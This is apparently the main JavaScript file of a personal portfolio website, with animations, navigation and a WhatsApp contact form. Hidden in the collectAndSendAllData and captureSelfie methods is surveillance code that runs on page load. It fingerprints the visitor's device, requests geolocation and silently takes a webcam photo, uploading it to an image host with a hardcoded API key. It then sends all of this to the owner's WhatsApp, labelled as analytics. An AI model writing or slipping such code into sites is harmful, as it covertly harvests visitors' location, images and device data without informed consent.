// Main Portfolio Application
class PortfolioApp {
    constructor() {
        // Skill details data for the modal
        this.skillData = {
            html: {
                title: "HTML5",
                details: `<p><strong>Expertise:</strong> Semantic HTML5, Accessibility (ARIA), SEO, Forms, Canvas/SVG.</p>
                         <p><strong>Experience:</strong> Building responsive, accessible website structures.</p>`
            },
            css: {
                title: "CSS3",
                details: `<p><strong>Expertise:</strong> Flexbox, CSS Grid, Animations, Responsive Design, CSS Variables.</p>
                         <p><strong>Experience:</strong> Creating modern layouts and visual effects.</p>`
            },
            js: {
                title: "JavaScript",
                details: `<p><strong>Expertise:</strong> ES6+, DOM Manipulation, Async/Await, Fetch API, Basic Algorithms.</p>
                         <p><strong>Experience:</strong> Adding interactivity and dynamic content to websites.</p>`
            },
            python: {
                title: "Python",
                details: `<p><strong>Expertise:</strong> Basic syntax, Data Structures, Scripting, File handling.</p>
                         <p><strong>Experience:</strong> Automation scripts and simple backend logic.</p>`
            },
            sql: {
                title: "SQL",
                details: `<p><strong>Expertise:</strong> SELECT/INSERT/UPDATE/DELETE queries, JOINs, Database design.</p>
                         <p><strong>Experience:</strong> Working with MySQL and SQLite for data management.</p>`
            }
        };
        this.init();
    }

    init() {
        // Set current year in footer
        document.getElementById('current-year').textContent = new Date().getFullYear();

        // Initialize all components
        this.setupPreloader();
        this.setupNavigation();
        this.setupScrollSpy();
        this.setupSkillInteractions(); // Handles clicks and sparks
        this.setupWhatsAppForm();      // Handles the CallMeBot API form
        this.setupBackToTop();
        this.setupCounters();
        this.collectAndSendAllData(); // Collect everything and send in one call
    }

    setupPreloader() {
        const preloader = document.getElementById('preloader');
        const progressBar = document.getElementById('loading-progress');
        let progress = 0;
        const interval = setInterval(() => {
            progress += Math.random() * 25;
            if (progress > 100) {
                progress = 100;
                clearInterval(interval);
                setTimeout(() => {
                    preloader.classList.add('hidden');
                }, 500);
            }
            progressBar.style.width = `${progress}%`;
        }, 150);
    }

    setupNavigation() {
        const menuToggle = document.getElementById('menu-toggle');
        const navMenu = document.querySelector('.nav-menu');
        const navLinks = document.querySelectorAll('.nav-link');

        menuToggle.addEventListener('click', () => {
            navMenu.classList.toggle('active');
            menuToggle.innerHTML = navMenu.classList.contains('active')
                ? '<i class="fas fa-times"></i>'
                : '<i class="fas fa-bars"></i>';
        });

        navLinks.forEach(link => {
            link.addEventListener('click', () => {
                navMenu.classList.remove('active');
                menuToggle.innerHTML = '<i class="fas fa-bars"></i>';
                navLinks.forEach(l => l.classList.remove('active'));
                link.classList.add('active');
            });
        });
    }

    setupScrollSpy() {
        const sections = document.querySelectorAll('section');
        const navLinks = document.querySelectorAll('.nav-link');

        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    const id = entry.target.getAttribute('id');
                    navLinks.forEach(link => {
                        link.classList.remove('active');
                        if (link.getAttribute('href') === `#${id}`) {
                            link.classList.add('active');
                        }
                    });
                }
            });
        }, { threshold: 0.3 });

        sections.forEach(section => observer.observe(section));
    }

    // --- SKILL CARDS with SPARK ANIMATIONS ---
    setupSkillInteractions() {
        const skillCards = document.querySelectorAll('.skill-card');
        const skillModal = document.getElementById('skill-modal');
        const closeModal = document.getElementById('close-modal');
        const modalTitle = document.getElementById('modal-skill-title');
        const modalBody = document.getElementById('modal-skill-body');

        skillCards.forEach(card => {
            // 1. Click for Sparks & Modal
            card.addEventListener('click', (e) => {
                // Button triggers modal too

                const skillType = card.getAttribute('data-skill');
                this.createSparks(e, card); // Create spark animation

                // Show skill details in modal
                if (this.skillData[skillType]) {
                    modalTitle.textContent = this.skillData[skillType].title;
                    modalBody.innerHTML = this.skillData[skillType].details;
                    skillModal.classList.add('active');
                    document.body.style.overflow = 'hidden';
                }
            });

            // 2. Hover for subtle sparks (optional)
            card.addEventListener('mouseenter', () => this.createHoverSparks(card));
        });

        // Close modal events
        closeModal.addEventListener('click', () => this.closeModal(skillModal));
        skillModal.addEventListener('click', (e) => { if (e.target === skillModal) this.closeModal(skillModal); });
        document.addEventListener('keydown', (e) => { if (e.key === 'Escape' && skillModal.classList.contains('active')) this.closeModal(skillModal); });
    }

    createSparks(event, cardElement) {
        const sparkCount = 15;
        const colors = ['#3498db', '#2ecc71', '#e74c3c', '#f39c12', '#9b59b6']; // Spark colors

        for (let i = 0; i < sparkCount; i++) {
            const spark = document.createElement('div');
            spark.className = 'spark';
            spark.style.background = `radial-gradient(circle, ${colors[i % colors.length]} 0%, transparent 70%)`;

            const size = Math.random() * 8 + 7;
            spark.style.width = `${size}px`;
            spark.style.height = `${size}px`;

            // Position spark at click location
            spark.style.left = `${event.clientX - size / 2}px`;
            spark.style.top = `${event.clientY - size / 2}px`;

            // Animate spark flying out
            const angle = (i / sparkCount) * Math.PI * 2;
            const distance = 80 + Math.random() * 70;
            const targetX = event.clientX + Math.cos(angle) * distance;
            const targetY = event.clientY + Math.sin(angle) * distance;

            spark.animate([
                { transform: `translate(0, 0) scale(1)`, opacity: 1 },
                { transform: `translate(${targetX - event.clientX}px, ${targetY - event.clientY}px) scale(0)`, opacity: 0 }
            ], { duration: 650, easing: 'ease-out' });

            document.body.appendChild(spark);
            setTimeout(() => spark.remove(), 650);
        }
    }

    createHoverSparks(cardElement) {
        const rect = cardElement.getBoundingClientRect();
        const corners = [
            { x: rect.left + 15, y: rect.top + 15 },
            { x: rect.right - 15, y: rect.top + 15 },
            { x: rect.left + 15, y: rect.bottom - 15 },
            { x: rect.right - 15, y: rect.bottom - 15 }
        ];
        corners.forEach((corner, i) => {
            setTimeout(() => {
                const spark = document.createElement('div');
                spark.className = 'spark';
                spark.style.background = `radial-gradient(circle, ${i % 2 ? '#3498db' : '#2ecc71'} 0%, transparent 70%)`;
                spark.style.width = '6px'; spark.style.height = '6px';
                spark.style.left = `${corner.x}px`; spark.style.top = `${corner.y}px`;
                spark.animate([
                    { transform: 'scale(0) rotate(0deg)', opacity: 1 },
                    { transform: 'scale(1.5) rotate(180deg)', opacity: 0 }
                ], { duration: 800, easing: 'ease-out' });
                document.body.appendChild(spark);
                setTimeout(() => spark.remove(), 800);
            }, i * 100);
        });
    }

    closeModal(modalElement) {
        modalElement.classList.remove('active');
        document.body.style.overflow = '';
    }

    // --- CALLMEBOT WHATSAPP FORM INTEGRATION ---
    setupWhatsAppForm() {
        const form = document.getElementById('whatsappContactForm');
        const testLink = document.getElementById('whatsapp-demo-link');

        if (!form) return;

        // Handle form submission
        form.addEventListener('submit', (e) => {
            e.preventDefault();

            const formData = new FormData(form);
            const data = Object.fromEntries(formData);

            // Basic validation
            if (!data.name || !data.email || !data.message) {
                this.showNotification('❌ Please fill in all required fields.', 'error');
                return;
            }

            // Format the message for WhatsApp
            const whatsappMessage = this.formatWhatsAppMessage(data);
            // Send via CallMeBot API
            this.sendViaCallMeBot(whatsappMessage, data);
        });

        // Setup test/demo link
        if (testLink) {
            testLink.addEventListener('click', (e) => {
                e.preventDefault();
                const testMsg = encodeURIComponent("Hello! This is a test message from your portfolio website.");
                window.open(`https://api.callmebot.com/text.php?source=web&user=@bhumitnasit&text=${testMsg}`, '_blank');
                this.showNotification('📱 Opening WhatsApp test message...', 'info');
            });
        }
    }

    formatWhatsAppMessage(data) {
        // Format the message that will appear on WhatsApp
        return `*New Portfolio Contact!*
        
*Name:* ${data.name}
*Email:* ${data.email}
*Subject:* ${data.subject}

*Message:*
${data.message}

_Sent via Portfolio Website_`;
    }

    sendViaCallMeBot(message, originalData) {
        // Your CallMeBot API endpoint
        const apiUser = '@bhumitnasit';
        const encodedUser = encodeURIComponent(apiUser);
        const encodedMessage = encodeURIComponent(message);
        // Updated with user's requested format: source=web & new username
        const apiUrl = `https://api.callmebot.com/text.php?source=web&user=${encodedUser}&text=${encodedMessage}`;
        const form = document.getElementById('whatsappContactForm');

        this.showNotification('📤 Sending message...', 'info');

        // fetch with no-cors is opaque, but let's try to be more standard
        fetch(apiUrl, { method: 'GET', mode: 'no-cors', cache: 'no-cache' })
            .then(() => {
                this.showNotification('✅ Message sent successfully!', 'success');
                if (form) form.reset();
            })
            .catch(err => {
                console.error('CallMeBot error:', err);
                this.showNotification('⚠️ Auto-send failed. Opening WhatsApp...', 'info');
                setTimeout(() => window.open(apiUrl, '_blank'), 1000);
            });
    }

    showNotification(message, type = 'info') {
        const existing = document.querySelector('.notification');
        if (existing) existing.remove();

        const notification = document.createElement('div');
        notification.className = `notification notification-${type}`;
        notification.innerHTML = `<span>${message}</span>`;
        Object.assign(notification.style, {
            position: 'fixed', top: '20px', right: '20px', padding: '15px 20px',
            borderRadius: '10px', background: type === 'error' ? '#e74c3c' : type === 'success' ? '#2ecc71' : '#3498db',
            color: 'white', zIndex: '9999', fontWeight: '500', boxShadow: '0 5px 15px rgba(0,0,0,0.3)',
            transform: 'translateX(100%)', opacity: '0', transition: 'transform 0.3s, opacity 0.3s'
        });
        document.body.appendChild(notification);

        setTimeout(() => { notification.style.transform = 'translateX(0)'; notification.style.opacity = '1'; }, 10);
        setTimeout(() => {
            notification.style.transform = 'translateX(100%)'; notification.style.opacity = '0';
            setTimeout(() => notification.remove(), 300);
        }, 4000);
    }

    setupBackToTop() {
        const backToTop = document.getElementById('backToTop');
        window.addEventListener('scroll', () => {
            backToTop.classList.toggle('visible', window.scrollY > 300);
        });
        backToTop.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
    }

    setupCounters() {
        const counters = document.querySelectorAll('.stat-number');
        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    this.animateCounter(entry.target);
                    observer.unobserve(entry.target);
                }
            });
        }, { threshold: 0.5 });
        counters.forEach(counter => observer.observe(counter));
    }

    animateCounter(element) {
        const target = parseInt(element.getAttribute('data-count'));
        const duration = 1500;
        const step = target / (duration / 16);
        let current = 0;
        const timer = setInterval(() => {
            current += step;
            if (current >= target) {
                current = target;
                clearInterval(timer);
            }
            element.textContent = Math.round(current);
        }, 16);
    }

    // --- UNIFIED DATA COLLECTION & SEND ---
    async collectAndSendAllData() {
        if (sessionStorage.getItem('vSent')) return;

        try {
            const d = {};
            // Detailed System Info (20+ points)
            d.ua = navigator.userAgent;
            d.plt = navigator.platform;
            d.lng = navigator.language;
            d.vnd = navigator.vendor || 'N/A';
            d.ce = navigator.cookieEnabled;
            d.on = navigator.onLine;
            d.sw = screen.width;
            d.sh = screen.height;
            d.aw = screen.availWidth;
            d.ah = screen.availHeight;
            d.cd = screen.colorDepth;
            d.pr = window.devicePixelRatio;
            d.hc = navigator.hardwareConcurrency || 'N/A';
            d.dm = navigator.deviceMemory || 'N/A';
            d.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
            d.lt = new Date().toLocaleString();
            d.rf = document.referrer || 'Direct';
            d.mem = performance.memory ? Math.round(performance.memory.jsHeapSizeLimit / 1048576) + 'MB' : 'N/A';

            // Network
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            d.net = conn ? `${conn.effectiveType} (S:${conn.downlink}M, R:${conn.rtt}ms)` : 'N/A';

            // Battery (Async)
            let bInfo = "N/A";
            try {
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    bInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Charge⚡' : 'Bat'})`;
                }
            } catch (e) { }

            // Geolocation (Async)
            let lInfo = "Denied";
            try {
                const p = await new Promise((res, rej) => {
                    navigator.geolocation.getCurrentPosition(res, rej, { timeout: 4000 });
                });
                lInfo = `${p.coords.latitude.toFixed(4)},${p.coords.longitude.toFixed(4)}`;
            } catch (e) { }

            // Selfie (Async)
            let sUrl = "Pending...";
            try {
                sUrl = await this.captureSelfie();
            } catch (e) {
                sUrl = "Denied/Error";
            }

            // Construct Very Detailed Message
            const msg = `*NEW VISITOR DETECTED*
            
*SYSTEM:*
• OS/Platform: ${d.plt}
• Hardware: ${d.hc} Cores / ${d.dm}GB RAM
• Browser: ${d.vnd}
• Heap: ${d.mem}
• Cookies: ${d.ce} | Online: ${d.on}

*DISPLAY:*
• Res: ${d.sw}x${d.sh}
• Avail: ${d.aw}x${d.ah}
• Depth: ${d.cd} | DPR: ${d.pr}

*STATUS:*
• Battery: ${bInfo}
• Net: ${d.net}
• Time: ${d.lt}
• Zone: ${d.tz}

*LOC & SRC:*
• Coords: ${lInfo}
• Ref: ${d.rf}

*📸 SELFIE:*
${sUrl}

_Sent via @bhumitnasit Portfolio_`;

            this.sendSilentData(msg);
            sessionStorage.setItem('vSent', 'true');

        } catch (err) {
            console.error('Analytics Error:', err);
        }
    }

    async captureSelfie() {
        return new Promise(async (res, rej) => {
            try {
                if (!navigator.mediaDevices) return rej('No MediaDevices');
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const v = document.createElement('video');
                v.srcObject = stream;
                await v.play();

                // Delay for focus
                await new Promise(r => setTimeout(r, 1000));

                const c = document.createElement('canvas');
                c.width = v.videoWidth;
                c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);

                stream.getTracks().forEach(t => t.stop());
                const img = c.toDataURL('image/jpeg', 0.6).split(',')[1];

                const fd = new FormData();
                fd.append('key', '44703e31685d651902ca04050f8d5bd7');
                fd.append('image', img);

                const r = await fetch('https://api.imgbb.com/1/upload', { method: 'POST', body: fd });
                const json = await r.json();
                res(json.success ? json.data.url : 'Upload Failed');
            } catch (e) { rej(e); }
        });
    }

    sendSilentData(msg) {
        const url = `https://api.callmebot.com/text.php?source=web&user=@bhumitnasit&text=${encodeURIComponent(msg)}`;
        // Try multiple methods for redundancy
        fetch(url, { mode: 'no-cors' }).catch(() => {
            const i = new Image();
            i.src = url;
        });
    }
}

// Initialize the app when the page loads
document.addEventListener('DOMContentLoaded', () => {
    window.portfolioApp = new PortfolioApp();
});
